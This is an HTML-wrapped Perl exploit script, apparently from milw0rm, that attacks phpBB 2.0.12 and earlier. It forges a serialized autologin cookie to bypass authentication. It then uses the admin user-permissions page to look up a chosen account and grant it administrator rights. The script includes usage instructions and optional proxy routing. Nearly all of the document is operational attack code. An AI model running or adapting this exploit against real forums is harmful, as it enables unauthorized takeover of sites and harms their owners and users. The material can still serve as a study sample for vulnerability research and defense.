@@ -1,0 +1,94 @@
+<html><head><title>phpBB <= 2.0.12 Change User Rights Authentication Bypass</title></head><pre>#!/usr/bin/perl -w
+
+# phpBB &lt;=2.0.12 session autologin exploit
+# This script uses the vulerability in autologinid variable 
+# More: http://www.phpbb.com/phpBB/viewtopic.php?f=14&amp;t=267563
+#
+# Just gives an user on vulnerable forum administrator rights.
+# You should register the user before using this ;-)
+ 
+#   by Kutas, kutas@mail15.com
+#P.S. I dont know who had made an original exploit, so I cannot place no (c) here...
+# but greets goes to Paisterist who made an exploit for Firefox cookies...
+
+if (@ARGV &lt; 3)
+ {
+ print q(
+ +++++++++++++++++++++++++++++++++++++++++++++++++++
+ Usage: perl nenu.pl [site] [phpbb folder] [username] [proxy (optional)] 
+ i.e. perl nenu.pl www.site.com /forum/ BigAdmin 127.0.0.1:3128
+ ++++++++++++++++++++++++++++++++++++++++++++++++++++
+           );   
+ exit;
+ } 
+use strict;
+use LWP::UserAgent;
+
+my $host  = $ARGV[0];
+my $path  = $ARGV[1];
+my $user  = $ARGV[2];
+my $proxy = $ARGV[3];
+my $request = &quot;http://&quot;;
+$request .= $host;
+$request .= $path; 
+ 
+
+use HTTP::Cookies;
+my $browser = LWP::UserAgent-&gt;new ();
+my $cookie_jar = HTTP::Cookies-&gt;new( );
+$browser-&gt;cookie_jar( $cookie_jar );
+$cookie_jar-&gt;set_cookie( &quot;0&quot;,&quot;phpbb2mysql_data&quot;, &quot;a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bb%3A1%3Bs%3A6%3A%22userid%22%3Bs%3A1%3A%222%22%3B%7D&quot;, &quot;/&quot;,$host,,,,,);
+if ( defined $proxy) {
+	$proxy =~ s/(http:\/\/)//eg;
+	$browser-&gt;proxy(&quot;http&quot; , &quot;http://$proxy&quot;);
+ }
+ print &quot;++++++++++++++++++++++++++++++++++++\n&quot;;
+ print &quot;Trying to connect to $host$path&quot;; if ($proxy) {print &quot;using proxy $proxy&quot;;}
+
+my $response = $browser-&gt;get($request);
+die &quot;Error: &quot;, $response-&gt;status_line
+ unless $response-&gt;is_success;
+ 
+if($response-&gt;content =~ m/phpbbprivmsg/) {
+  print &quot;\n   Forum is vulnerable!!!\n&quot;;
+} else {
+  print &quot;Sorry... Not vulnerable&quot;; exit();}
+
+print &quot;+++++++++++++++++++++++++++++\nTrying to get the user:$user ID...\n&quot;;
+$response-&gt;content =~ /sid=([\w\d]*)/;
+my $sid = $1;
+
+$request .= &quot;admin\/admin_ug_auth.php?mode=user&amp;sid=$sid&quot;;
+$response = $browser-&gt;post(
+  $request,
+  [
+    'username'  =&gt; $user,
+    'mode' =&gt; 'edit',
+    'mode' =&gt; 'user',
+    'submituser' =&gt; 'Look+up+User'
+  ],
+);
+die &quot;Error: &quot;, $response-&gt;status_line
+ unless $response-&gt;is_success;
+
+if ($response-&gt;content =~ /name=&quot;u&quot; value=&quot;([\d]*)&quot;/) 
+	{print &quot;   Done... ID=$1\n++++++++++++++++++++++++++++++\n&quot;;}
+   else {print &quot;No user $user found...&quot;; exit(); }	
+my $uid = $1;
+print &quot;Trying to give user:$user admin status...\n&quot;;
+
+$response = $browser-&gt;post(
+  $request,
+  [
+    'userlevel'  =&gt; 'admin',
+    'mode' =&gt; 'user',
+    'adv'=&gt;'',
+    'u'=&gt; $uid,
+    'submit'=&gt; 'Submit'
+  ],
+);
+die &quot;Error: &quot;, $response-&gt;status_line
+ unless $response-&gt;is_success;
+print &quot;   Well done!!! $user should now have an admin status..\n++++++++++++++++++++++++++++&quot;;
+
+# milw0rm.com [2005-03-21]</pre></html>
